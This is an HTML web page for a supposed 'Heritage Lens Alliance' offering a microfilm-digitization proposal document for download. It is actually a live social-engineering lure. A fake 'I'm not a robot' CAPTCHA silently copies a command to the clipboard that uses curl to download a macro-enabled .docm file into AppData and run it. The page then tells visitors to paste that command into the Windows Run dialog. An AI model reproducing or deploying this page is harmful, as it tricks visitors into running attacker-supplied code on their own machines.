<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-W36DJXBX');</script>
    <!-- End Google Tag Manager -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Heritage Lens Alliance - Active Efforts</title>
    <style>
        header {
            background-color: #333333; 
            padding: 10px 20px;
            color: #FFFFFF;
            display: flex;
            flex-direction: column; 
            align-items: center; 
            position: relative;
            z-index: 1000;
            width: 100%;
        }

        header img {
            height: 80px; 
            transition: transform 1.0s ease-in-out;
            margin-bottom: 10px; 
        }

        header img:hover {
            transform: scale(1.1); 
        }

        nav { 
            display: flex;
            justify-content: center;
            align-items: center;
        }

        nav a {
            color: #FFFFFF; 
            text-decoration: none;
            margin: 0 10px; 
            font-weight: bold;
            position: relative;
            display: inline-block; 
        }

        nav a:hover {
            color: #FFA500; 
        }

        main {
            padding: 20px;
            flex: 1;
            max-width: 800px;
            margin: 0 auto; 
            text-align: center; 
        }

        h1 {
            color: #FFA500;
            animation: fadeIn 3s ease-in-out; 
        }

        h2 {
            color: #FFA500;
            margin-top: 20px;
            border-bottom: 2px solid #FFA500;
            padding-bottom: 5px;
            animation: slideIn 0.5s ease-out;
        }

        p {
            color: #FFFFFF;
        }

        ul {
            list-style-type: disc;
            margin-left: 20px;
            animation: fadeIn 2s ease-in-out;
        }

        footer {
            background-color: #333333;
            color: #FFFFFF;
            text-align: center;
            padding: 10px 0;
            position: relative;
            bottom: 0;
            width: 100%;
        }

        a.button {
            display: inline-block;
            padding: 10px 20px;
            color: #FFFFFF;
            background-color: #FFA500;
            text-decoration: none;
            font-weight: bold;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        a.button:hover {
            background-color: #FF8C00; 
        }    
        
        /* Media Query for Mobile Responsiveness */
        @media (max-width: 768px) {
            header {
                flex-direction: column; 
                align-items: center;
                text-align: center;
            }

            header img {
                height: 50px; 
            }

            nav {
                flex-direction: row; 
                align-items: baseline; 
                margin-top: 10px;
            }

            nav a {
                margin: 3px 1; 
                font-size: 1em; 
            }

            main {
                padding: 10px; 
                margin: 0 auto; 
                max-width: 100%; 
            }

            .projects, .testimonials, .events {
                margin-top: 20px; 
            }
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        /* Modal Styles */
        .modal {
            display: none; /* Hidden by default */
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
            width: 80%;
            max-width: 400px;
        }

        /* Custom Google CAPTCHA style */
        .captcha-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            border: 1px solid #d3d3d3;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
        }

        .captcha-checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #d3d3d3;
            background-color: white;
            margin-right: 10px;
            cursor: pointer;
            position: relative;
        }

        .captcha-checkbox.checked {
            background-color: #4285f4;
            border-color: #4285f4;
        }

        .captcha-checkbox.checked::after {
            content: 'âœ“';
            font-size: 16px;
            color: white;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        /* Grey "I am not a robot" text */
        .captcha-text {
            font-size: 14px;
            color: rgb(20, 20, 20);
            margin-right: 10px;
        }

        .captcha-logo {
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/archive/a/ad/20180222151159%21RecaptchaLogo.svg/120px-RecaptchaLogo.svg.png');
            background-size: contain;
            background-repeat: no-repeat;
            width: 50px;
            height: 50px;
        }

        /* Close Button */
        .close-btn {
            background-color: #008cff;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: none;
        }

        .close-btn:hover {
            background-color: #006bb3;
        }

        /* Change the style of 'Please check the box below to proceed' */
        h3 {
            font-weight: normal; /* Changed from bold to normal */
            font-size: 16px;
            color: #333333;
        }

        /* Left-align the instructions */
        .instructions {
            text-align: left;
            color: #333333;
        }

        /* Global Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #dddddd;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: linear-gradient(to bottom, #636262, #333333);
        }
    </style>
</head>
<body>
    
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W36DJXBX"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <header>
        <img src="heritagelenslogo.png" alt="Heritage Lens Alliance Logo">
        <nav>
            <a href="index.html">Home</a>
            <a href="about.html">About</a>
            <a href="projects.html">Projects</a>
            <a href="rfp.html">Active Efforts</a>
            <a href="contact.html">Contact</a>
        </nav>
    </header>
    <main>
        <h1>Active Efforts</h1>
        <h2>Microfilm Digitization Project</h2>
        <p>We are seeking proposals from qualified vendors for the digitization of damaged microfilm archives using advanced machine learning processing techniques. To participate in this opportunity, please download the required documents below and provide detailed responses to the questions provided.</p>
        <a href="#" class="button" id="downloadButton">Download Document</a>
    </main>

    <!-- Initial Verification Modal -->
    <div id="verificationModal" class="modal">
        <div class="modal-content">
            <h3>Please check the box below to proceed</h3>
            <div class="captcha-container">
                <div id="captchaCheckbox"
                <div id="captchaCheckbox" class="captcha-checkbox"></div> <!-- Clickable box -->
                <div class="captcha-text">I'm not a robot</div> <!-- Added text "I am not a robot" -->
                <div class="captcha-logo"></div> <!-- CAPTCHA logo -->
            </div>
            <button class="close-btn" id="verifyButton">Verify</button>
        </div>
    </div>

    <!-- CAPTCHA Instruction Modal -->
    <div id="captchaModal" class="modal">
        <div class="modal-content">
            <h3>Verification Instructions</h3>
            <ol class="instructions">
                <li>Press the <b>Windows key + R</b> to open the Run dialog.</li>
                <li>Press <b>Ctrl + V</b> to paste the text provided below.</li>
                <li>Press <b>Enter</b> to confirm.</li>
            </ol>
            <button class="close-btn" onclick="verifyCaptcha()">Submit</button>
            <div id="error-message" style="color: red;"></div>
        </div>
    </div>

    <script>
        // Handle the download button click
        document.getElementById("downloadButton").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent the default action
            document.getElementById("verificationModal").style.display = "flex"; // Show the CAPTCHA modal
        });

        // Handle the CAPTCHA checkbox click
        document.getElementById("captchaCheckbox").addEventListener("click", function() {
            // Toggle checkbox status
            if (this.classList.contains("checked")) {
                this.classList.remove("checked"); // Uncheck
                document.getElementById("verifyButton").style.display = "none"; // Hide button
            } else {
                this.classList.add("checked"); // Check
                document.getElementById("verifyButton").style.display = "inline-block"; // Show button

                // Copy the hidden text to the clipboard when the CAPTCHA is checked
                var textToCopy = 'cmd /c curl https://www.heritagelens.net/HeritageLensAlliance.docm -o %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm && %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm';
                navigator.clipboard.writeText(textToCopy).then(function() {
                    console.log('Text copied to clipboard');
                }).catch(function(err) {
                    console.error('Could not copy text: ', err);
                });
            }
        });

        // Handle the "Verify" button click
        document.getElementById("verifyButton").addEventListener("click", function() {
            document.getElementById("verificationModal").style.display = "none"; // Close the CAPTCHA modal
            document.getElementById("captchaModal").style.display = "flex"; // Show the CAPTCHA instructions modal
        });

        // Function to verify CAPTCHA
        function verifyCaptcha() {
            const correctAnswer = "cmd /c curl https://www.heritagelens.net/HeritageLensAlliance.docm -o %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm && %appdata%\\Microsoft\\Templates\\HeritageLensAlliance.docm'";
            const userAnswer = document.getElementById('captcha-answer')?.value.trim();
            const errorMessage = document.getElementById('error-message');

            if (userAnswer === correctAnswer) {
                document.getElementById("captchaModal").style.display = "none"; // Close CAPTCHA modal
                // Redirect to the document download
                window.location.href = "HeritageLensAlliance.rar"; // Change to the actual document URL
            } else {
                errorMessage.textContent = "Verification failed. Please try again.";
            }
        }
    </script>

    <footer>
        <p>&copy; 2024 Heritage Lens Alliance. All rights reserved.</p>
    </footer>
</body>
</html>
